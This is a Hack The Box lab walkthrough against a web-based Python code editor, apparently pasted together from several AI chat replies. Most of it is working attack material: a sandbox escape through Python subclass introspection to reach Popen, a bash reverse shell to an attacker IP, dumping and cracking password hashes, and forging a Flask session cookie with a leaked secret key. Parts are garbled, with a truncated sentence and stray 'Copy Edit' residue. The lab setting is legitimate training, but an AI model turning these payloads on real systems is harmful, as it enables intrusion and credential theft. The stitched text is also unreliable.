# HTB Walkthrough: Deep Obfuscated RCE via Python Code Editor on Port 5000

## 🧭 Step 1: Initial Enumeration with Nmap

```bash
nmap -sV -sC 10.129.231.240
```

**Result:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1
5000/tcp open  http    Gunicorn 20.0.4
```

- Port 5000: Hosted a **Python code execution environment** served via Gunicorn.
- Browsing to `http://10.129.231.240:5000` revealed a web interface that lets you **write and execute Python code** in the browser.

---

## 🧪 Step 2: Sanity Check — Does Code Execution Work?

Tested this:

```python
print("test")
```

✅ Output showed `"test"` — this proved **some level of live code execution was working**.

---

## ❌ Step 3: Tried Direct RCE Methods (Blocked by Sandbox)

### Tried:
```python
import os
os.system("id")
```

❌ Result: "Use of restricted keyword is not allowed"

The application is clearly filtering or rejecting dangerous keywords like:
- `import`
- `os`
- `exec`
- `eval`
- `subprocess`
- and possibly even `__import__`

### Next Attempt:
```python
__import__('os').system('id')
```

❌ Also blocked — confirms it’s **filtering even obfuscated or indirect access to imports**.

---

## 🧠 Step 4: Obfuscated Enumeration — Class Subclass Bypass

When `import` and `exec` are blocked, the next step is to leverage Python’s introspection:

### Ran this:
```python
for i, cls in enumerate((0).__class__.__base__.__subclasses__()):
    try:
        print(i, cls.__name__)
    except:
        pass
```

✅ This dumped a list of all classes currently in memory — **bypassing import entirely**, using Python’s internal class hierarchy.

### Key Output:
```text
317 Popen
```

At index 317 was the class `Popen` from `subprocess`. This was our **gateway to shell access**, because `Popen` lets you run system commands without `import`.

---

## 🧪 Step 5: Proved Execution with `Popen` (But Output Not Visible)

Ran:
```python
(0).__class__.__base__.__subclasses__()[317]('whoami', shell=True)
print("hey")
```

✅ Output only showed: `hey`

🧩 Troubleshooting:
- We confirmed the command likely executed (no crash), but `Popen` doesn’t show output by default.
- We needed to **capture stdout** explicitly.

---

## 🔍 Step 6: Captured Output of Command

Used:
```python
print((0).__class__.__base__.__subclasses__()[317]('whoami', shell=True, stdout=-1).communicate()[0].decode())
```

✅ Output:
```
app-production
```

🎯 Success: This printed the output of the `whoami` command, confirming we could run **arbitrary system commands and capture their output**.

---

## 🐚 Step 7: Spawned a Reverse Shell Using the Same Technique

### On Kali (listener setup):
```bash
nc -lvnp 4444
```

### Reverse Shell Payload:
```python
(0).__class__.__base__.__subclasses__()[317]("bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1'", shell=True)
```

> 🔁 Replace `10.10.14.XX` with your Kali IP address.

✅ This connected back as user: `app-production`

---

## 🧱 Troubleshooting Reverse Shell (What Could Have Gone Wrong)

| Problem | Symptom | Fix |
|--------|---------|-----|
| Output not visible | Only `print()` shows text | Use `.communicate()` with `stdout=-1` |
| No shell | Reverse shell payload runs but no connection | Double-check your IP/port, and that `nc -lvnp 4444` is listening |
| Payload blocked | If even obfuscated payload fails | Encode with Base64 and `exec(base64.b64decode(...))` (but `exec` may be blocked too) |
| App crashes | Likely invali

## 🧨 Post-RCE Enumeration and Exploitation (Continued)

---

### ✅ Extracted Real SQLite Database

After discovering `/run_code` RCE via `exec()` bypass, we pivoted to data extraction:

```bash
find / -name "*.db" 2>/dev/null
```

This revealed the real app DB at:

```
/home/app-production/app/instance/database.db
```

We queried the `user` table directly:

```bash
sqlite3 instance/database.db "SELECT id, username, password FROM user;"
```

✅ Output:

| ID | Username      | MD5 Password Hash                     |
|----|---------------|----------------------------------------|
| 1  | development   | 759b74ce43947f5f4c91aeddc3e5bad3       |
| 2  | martin        | 3de6f30c4a09c27fc71932bfc68474be       |

These are unsalted **MD5** hashes — extremely weak.

---

### 🔐 Password Cracking (Offline via John)

Created a hash file on Kali:

```bash
echo "759b74ce43947f5f4c91aeddc3e5bad3" > hashes.txt
echo "3de6f30c4a09c27fc71932bfc68474be" >> hashes.txt
```

Cracked with:

```bash
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Waiting for cracked credentials to login or escalate further.

---

### 🔏 Flask Session Forgery (No Password Needed)

From `app.py`, we confirmed the Flask `SECRET_KEY`:

```python
SECRET_KEY = "7j4D5htxLHUiffsjLXB1z9GaZ5"
```

Using this, we forged a valid session cookie:

```bash
flask-unsign --sign --cookie "{'user_id': 1}" --secret '7j4D5htxLHUiffsjLXB1z9GaZ5'
```

This session identifies as `development` (likely admin). Can now bypass login and access restricted routes like `/codes`, `/save_code`, `/logout`.

---

### 🧠 Takeaway So Far

| Objective                         | Status  | Notes                                    |
|----------------------------------|---------|------------------------------------------|
| Code execution via `/run_code`   | ✅       | Used subclass+exec RCE bypass            |
| Locate real DB                   | ✅       | Found at `instance/database.db`          |
| Extract user data                | ✅       | Dumped usernames + MD5 hashes            |
| Crack MD5 passwords              | 🕐       | In progress (using `john`)               |
| Forge Flask session              | ✅       | Can impersonate any user (e.g. ID 1)     |

---

### 🔜 Next Targets

- Login or session-hijack as user ID 1 (admin)
- Check if `/codes` or `/save_code` gives access to sensitive content
- Attempt privilege escalation (via `sudo`, Docker breakout, or writable crons)
- Gain full root access on host

Let me know when the password cracks finish or if you'd like to continue with escalation!

# 🔓 HTB Walkthrough: Post-RCE Enumeration and Privilege Escalation Attempt via `backy.sh`

---

## 🧍 Step 8: SSH Access as `martin` (Post-Hash Crack)

Once the MD5 hash for `martin` was cracked (`nafeelswordsmaster`), SSH access was obtained:

```bash
ssh martin@10.129.231.240
✅ You successfully gained a shell as martin.

🔍 Step 9: Privilege Escalation Enumeration
Checked sudo permissions:

bash
Copy
Edit
sudo -l
Result:

text
Copy
Edit
User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
This means martin can run /usr/bin/backy.sh as root without a password.

📜 Step 10: Review /usr/bin/backy.sh
bash
Copy
Edit
cat /usr/bin/backy.sh
Behavior Summary:
Takes one argument: a .json file

Validates that paths in directories_to_archive are within /home/ or /var/

Removes "../" from input paths (to prevent traversal)

Invokes /usr/bin/backy on the JSON

bash
Copy
Edit
/usr/bin/backy "$json_file"
❌ Step 11: Blocked Path Attempts
Tried to archive restricted paths:

json
Copy
Edit
{
  "directories_to_archive": ["/etc"]
}
Or:

json
Copy
Edit
{
  "directories_to_archive": ["/root/.ssh"]
}
Error:

text
Copy
Edit
Only directories under /var/ and /home/ are allowed.
This confirmed path whitelisting was enforced.

✅ Step 12: Test with Valid Path
Created a test folder:

bash
Copy
Edit
mkdir ~/testdir
echo "privesc-test" > ~/testdir/pwned.txt
Wrote valid JSON:

json
Copy
Edit
{
  "directories_to_archive": ["/home/martin/testdir"],
  "destination": "/home/martin/backups/test.tar.gz"
}
Executed the backup:

bash
Copy
Edit
sudo /usr/bin/backy.sh exploit.json
Result:

text
Copy
Edit
💢 Archiving failed for: /home/martin/testdir
❗ Archiving completed with errors
Even though path was allowed and files existed, archiving failed.

🧱 Step 13: Troubleshooting
Confirmed /usr/bin/backy is a root-owned binary with no SUID bit

Tried replacing it with a payload using tee → blocked by sudo

Could not write to /usr/bin/

Confirmed the tarball /home/martin/backups/test.tar.gz was not created

Tried different JSON structures → same failure

🔍 Why backy.sh PrivEsc Doesn’t Work
Root Cause	Explanation
backy.sh is just a wrapper	It passes your JSON to /usr/bin/backy
backy runs as martin	It does not inherit root privileges
Binary is not SUID	Even via sudo, it's not privileged inside
Likely internal permission checks	backy probably tries to stat, read, or chown files it can’t access

✅ Current State Summary
Objective	Status	Notes
Reverse shell from web editor	✅	Used obfuscated Popen payload
Found and dumped real database	✅	Used sqlite3 on instance/database.db
Cracked MD5 passwords	✅	Cracked with john + rockyou.txt
SSH access as martin	✅	Full shell obtained
sudo rights to backy.sh	✅	Confirmed no password required
PrivEsc via backy	❌	Fails silently; no output created

🔜 Next Steps
Search for other writable configs, logs, or crons

Explore /var for backup artifacts or logs written by backy

Use find, strings, grep, or strace to analyze backy

Begin full privilege escalation sweep:

bash
Copy
Edit
sudo -l
find / -perm -4000 2>/dev/null
find /home /var -writable 2>/dev/null
getcap -r / 2>/dev/null
